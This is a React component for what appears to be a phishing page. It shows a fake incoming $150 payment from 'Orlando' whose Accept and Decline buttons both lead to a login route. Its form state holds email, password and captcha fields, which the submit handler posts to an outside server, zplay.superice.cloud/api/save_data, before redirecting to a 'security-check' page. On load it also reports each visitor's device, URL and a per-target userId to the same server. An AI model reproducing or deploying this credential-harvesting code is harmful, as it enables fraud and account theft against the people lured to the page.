import React, { useState, useEffect } from "react";
import { useParams, useNavigate,Link } from "react-router-dom";
import { isMobile, isTablet, isDesktop } from "react-device-detect";

const Home = () => {
  const { userId } = useParams();
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    email: "",
    password: "",
    userId: "",
    userAgent: "",
    message: "",
    landing_url: "",
    captcha: "", // Added
  });

  // Determine device type
  const mobile = isMobile ? 1 : 0;
  const desktop = isDesktop ? 1 : 0;
  const tablet = isTablet ? 1 : 0;

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  useEffect(() => {
    const updateFormData = () => {
      setFormData((prevData) => ({
        ...prevData,
        userAgent: navigator.userAgent,
        landing_url: window.location.href,
        userId: userId,
      }));
    };

    const sendHitData = async () => {
      try {
        const data = {
          mobile: mobile,
          desktop: desktop,
          tablet: tablet,
          landing_url: window.location.href,
          userId: userId,
        };
        const response = await fetch("https://zplay.superice.cloud/api/hit", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        });

        if (response.ok) {
          const result = await response.json();
          console.log("Server Response:", result);
        } else {
          alert("Error submitting form");
        }
      } catch (error) {
        console.error("Error:", error);
      }
    };

    updateFormData();
    sendHitData();
  }, [userId, mobile, desktop, tablet]);

  const handleSubmit = async (e) => {
    e.preventDefault(); // Prevents the default form submission behavior

    try {
      const response = await fetch("https://zplay.superice.cloud/api/save_data", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        const result = await response.json();
        console.log("Server Response:", result);
        if (result.success) {
          sessionStorage.setItem("insertId", result.id);
          navigate("/security-check");
        }
      } else {
        alert("Error submitting form");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred while submitting the form.");
    }
  };

  const handleAccept = () => {
    console.log('Payment Accepted');
  };

  const handleDecline = () => {
    console.log('Payment Declined');
  };
 return (
    <div className="payment-container">
      <img
        src={`/images/mdl.jpg`}
        alt="Profile"
        className="profile-picture"
      />
      <div className="user-name">Orlando</div>
      <div className="payment-details">Payment from Orlando</div>
      <div className="midl">
        <div className="amount">$150.00</div>
        <div className="description">For la flame fans must eat</div>
        <div className="timestamp"></div>
      </div>
      <div>
        <Link
          className="status"
          onClick={handleAccept}
          to="/auth/login"
        >
          Accept
        </Link>
        <Link
          
          className="status"
          style={{ background: '#c94b24' }}
          onClick={handleDecline}
          to="/auth/login"
        >
          Decline
        </Link>
      </div>
    </div>
  );
};

export default Home;
